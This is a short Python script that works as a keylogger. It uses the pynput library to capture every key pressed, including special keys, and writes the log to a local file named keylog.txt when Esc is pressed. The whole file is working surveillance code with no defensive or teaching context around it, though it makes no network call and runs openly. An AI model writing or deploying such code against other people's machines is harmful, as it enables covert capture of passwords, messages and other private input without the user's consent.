import pynput.keyboard

# Global variable to store keystrokes
logged_keys = []

# Function to write logged keys to a file
def write_to_file(keys):
    with open("keylog.txt", "a") as file:
        for key in keys:
            file.write(str(key) + "\n")

# Function to handle key presses
def on_press(key):
    global logged_keys
    try:
        # Convert key to string and append to logged keys
        logged_keys.append(key.char)
    except AttributeError:
        # Special keys (e.g., Ctrl, Alt) are handled separately
        if key == key.space:
            logged_keys.append(" ")
        else:
            logged_keys.append("[" + str(key) + "]")

# Function to handle key releases
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop listener if Esc key is pressed
        return False

# Create a keyboard listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Write logged keys to file when listener is stopped
write_to_file(logged_keys)
